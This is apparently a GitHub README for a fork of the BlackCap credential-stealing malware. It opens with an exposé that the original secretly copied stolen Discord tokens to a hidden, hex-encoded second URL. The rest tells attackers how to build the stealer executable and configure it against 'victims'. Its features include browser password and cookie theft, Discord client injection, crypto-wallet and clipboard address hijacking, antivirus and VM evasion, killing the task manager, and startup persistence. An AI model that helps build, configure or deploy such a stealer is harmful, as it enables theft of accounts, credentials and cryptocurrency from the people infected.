# Proofs that BlackCap-Grabber was a Dual Hook :
An investigation has uncovered that the `main.py` file in the BlackCap repository injects malicious nodejs code into the Discord `%APPDATA%/Discord/app-(versions)/modules/discord_desktop_core/index.js` module. The contents of the script can be found in another repository and are retrieved in the `main.py` file (see [link](https://github.com/KSCHdsc/BlackCap-Grabber/blob/main/main.py#L57)).

The `inject.js` file, which is executed by the main thread of Electron (Discord), is responsible for stealing the Discord session token and collecting various information about the victim. The attacker receives this information, but a copy is also sent to `https://login.blackcap-grabber.com:3000/premium/` using a `POST` method (see [link](https://github.com/KSCHdsc/BlackCap-Inject/blob/main/index.js#L20)) note that the url is encoded in hexadecimal and can be decoded by using console.log() 
```js
console.log("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6c\x6f\x67\x69\x6e\x2e\x62\x6c\x61\x63\x6b\x63\x61\x70\x2d\x67\x72\x61\x62\x62\x65\x72\x2e\x63\x6f\x6d\x3a\x33\x30\x30\x30\x2f\x70\x72\x65\x6d\x69\x75\x6d\x2f")

OUTPUT : https://login.blackcap-grabber.com:3000/premium/
```

A review of the code [link](https://github.com/KSCHdsc/BlackCap-Inject/blob/main/index.js#L186) reveals that we send the same HTTP request 2 times,
one time for `config.webhook` and one time for `config.uwu` who is the dualhook url.

![](https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png)

**NOTE:** 
- BlackCap was made for educational purposes, there for all consequences caused by your actions are **your** responsibility and accountability.
- You got an error? you've find a bug? Create an issue!

---

## <a id="content"></a>🌐 〢 Content

- [🎉・Setting up BlackCap](#setup)
- [🔰・Features](#features)
- [👁️・Features Explanation](#explanation)
- [📝・Changelog](#changelog)
- [🕵️‍♂️・Credits](#forkedfrom)
- [💼・Term](#terms)


## <a id="setup"></a> 📁 〢 Setting up BlackCap

1. Install [Python](https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe)
2. Install [BlackCap Files](https://github.com/Inplex-sys/BlackCap-Grabber-NoDualHook/archive/refs/heads/main.zip)
3. Install all requirements [install.bat](https://github.com/Inplex-sys/BlackCap-Grabber-NoDualHook/blob/main/install.bat)
4. Click on start.bat [start.bat](https://github.com/Inplex-sys/BlackCap-Grabber-NoDualHook/blob/main/start.bat)
5. Complete the configuration
6. You have your .exe file enjoy :)


## <a id="features"></a>🔰 〢 Features

```diff
> Default:

- Steal Steam / Minecraft / Metamask / Exodus / Roblox / NationGlory login
- Steal Chrome Passwords / Cookies / History
- Inject Discord / Discord Canary / Lightcord / Ripcord / Xcord
- Debug Killer (Kill task gestionary)
- Bypass TokenProtector / BetterDiscord
- Take a Screenshot
- Grabb System Informations
- Bypass Virus Total machines
- Bypass VM machines
- Hide Itself in Background
- Replace the BTC address copying by your
- Custom Installer / Setuper
- Icon / Name / Description Customizable
- Cookies Exploiter Tech (💎)
- Steal all Chromium Passwords and Cookies for OperaGX/Opera/GoogleChrome/Brave/Chromium/Torch/Edge/Mozilla and others
- 0/64 Detect Virus Total Builder (.exe) (💎)
- Grabb Sensitive Files exodus login / a2f backup codes / tokens / passwords... (can be customizable) (💎)



> Injection:

- Nitro Auto Buy
- First Start Reporter
- New Passwords
- New Emails
- New Login
- New Credit Card
- New PayPal
- Anti Delete system (re install after Discord uninstall / Discord Update)
> + More!
```

## <a id="explanation"></a>👁️ 〢 Explanations of Features and options


![](https://media.discordapp.net/attachments/912038729626058853/1062467388320272504/image.png)
```d
@blackcap: Here put your Discord Webhook you can find it in your 
"DISCORD CHANNEL OPTIONS" > "INTEGRATION" > "CREATE A WEBHOOK"
```
![](https://media.discordapp.net/attachments/912038729626058853/1062467782446420049/image.png)
```d
@blackcap: Here put your final file name like who is not going to be obvious
```
![](https://media.discordapp.net/attachments/912038729626058853/1062468541967773756/image.png)
```d
@blackcap: This is a option to "KILL" all discord clients opened 
and to restart them with the blackcap injection 
(so i recommand "yes")
```
![](https://media.discordapp.net/attachments/912038729626058853/1062469117954768998/image.png)
```d
@blackcap: This is a option to "KILL" all process which could analyze the properties of blackcap, 
such as the task manager, the terminal or even analysis tools (so i recommand "yes")
```
![](https://media.discordapp.net/attachments/912038729626058853/1062469614036078642/image.png)
```d
@blackcap: This is a option to ping when someone run BlackCap you can specify "everyone" or "here"
```
![](https://media.discordapp.net/attachments/912038729626058853/1062470764609151016/image.png)
```d
@blackcap: This option replaces each of the crypto addresses copied by the victim with yours, 
it will not realize that it is not the same and during a payment the cryptomoney will be sent 
to your address

//Yeah, that OP i know
```
![](https://media.discordapp.net/attachments/912038729626058853/1062471735582146630/image.png)
```d
@blackcap: If you chose 'yes' to the previous option you will have to fill in this with 
YOUR crypto wallet addresses 
(You can also put mine)👌
```
![](https://media.discordapp.net/attachments/912038729626058853/1062472209777574009/image.png)
```d
@blackcap: This option allows you to display an error message when someone launches your blackcap 
for the moment it is a predefined message but later it will be customizable
```
![](https://media.discordapp.net/attachments/912038729626058853/1062472564078817330/image.png)
```d
@blackcap: This option will make a copy of the .exe in the windows startup of your victims and 
blackcap will therefore launch at each start

(if you have activated the address crypto replacer I advise you to activate this one)
```
![](https://media.discordapp.net/attachments/912038729626058853/1062473429216919684/image.png)
```d
@blackcap: This option will close automatically the window that will launch blackcap 
(also works if you let the final file in .py so i recommand 'yes')
```
![](https://media.discordapp.net/attachments/912038729626058853/1062473970537992192/image.png)
```d
@blackcap: This option will obfuscate the source code "BUT THIS OBFUSCATION WAS DETECTED"
I recommand to chose 'no'
```
![](https://media.discordapp.net/attachments/912038729626058853/1062474365079388201/image.png)
```d
@blackcap: This option will create an .exe if you put 'no' the final file will be an .py
```
![](https://media.discordapp.net/attachments/912038729626058853/1062474813135925288/image.png)
```d
@blackcap: If you chose 'yes' in the previous option this option will add an icon to your .exe
```

## <a id="changelog"></a>💭 〢 ChangeLog

```diff
v1.9 ⋮ 2022-26-10
- bug fix to search token
- error message fixed
- build with pyinstaller fixed

v2.0 : 2022-30-10
- enoent zipfile bug fixed
+ Place .exe in startup
+ Add Fake Error

v2.1: 2022-30-10
+ New builder
+ Ping on run
+ Task Manager killer

v2.1.1: 2022-31-10
- Builder correction
+ Compacting Builder
+ Add auto compressed build

v2.2: 2022-31-10
- Token Grabber Correction
+ Grab all other Browsers
+ CMD and gestionnary killer


v2.2.5: 2022-14-11
+ Detect New Discord Active Developer Badge


v2.3: 2023-10-01
- 0 detection source code by virustotal
- Builder error patched
+ New code optimisation
+ New features can replace all crypto wallet by your address

v2.3.5: 2023-20-01
- Detect Patched
- Builder .exe deleted patched


v2.3.8: 2023-21-01
- Text Encoder Bug Fixed
+ New Cookies Format (Can be used by Cookie Quick Manager extension)


v2.3.9: 2023-21-01
+ AntiDebug More Powerfull (check ip)
```

### Contributors (CapingTeam)
- Inplex-sys
- Xenis
- Nono1337
- Irax212
- Shamroks

### <a id="forkedfrom"></a>🕵️‍♂️ 〢 Forked From:
- Hazard Grabber
- PirateStealer
- Wasp-stealer
- Builder by Luna token grabber 


### <a id="terms"></a>💼 〢 Terms Of Usage

- [x] Educational purpose only
- [x] Reselling is forbidden
- [x] You can use the source code if you keep credits (in embed + in markdown), it has to be open-source
- [x] We are NOT responsible of anything you do with our software (if its illegal)


<a href=#top>Back to Top</a></p>
![](https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/mona-loading-dark.gif)

nrazt